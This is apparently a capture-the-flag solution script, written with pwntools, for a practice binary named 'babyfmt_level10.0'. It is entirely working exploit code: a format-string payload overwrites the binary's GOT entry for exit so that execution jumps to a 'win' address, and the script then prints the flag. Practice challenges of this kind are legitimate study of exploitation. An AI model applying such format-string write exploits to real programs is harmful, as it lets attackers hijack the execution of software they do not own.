from pwn import *

exe = ELF('babyfmt_level10.0')
io = exe.process()
context.arch = 'amd64'
#gdb.attach(io, api=True)

win = 0x00000000004012fd

io.recvuntil(b'Have fun!')
payload = b'-'*5 + fmtstr_payload(24, {exe.got['exit']:win}, 96)
io.sendline(payload)
io.recvuntil(b'Here is your flag:')
print(io.recvline())
print(io.recvline())
#io.interactive()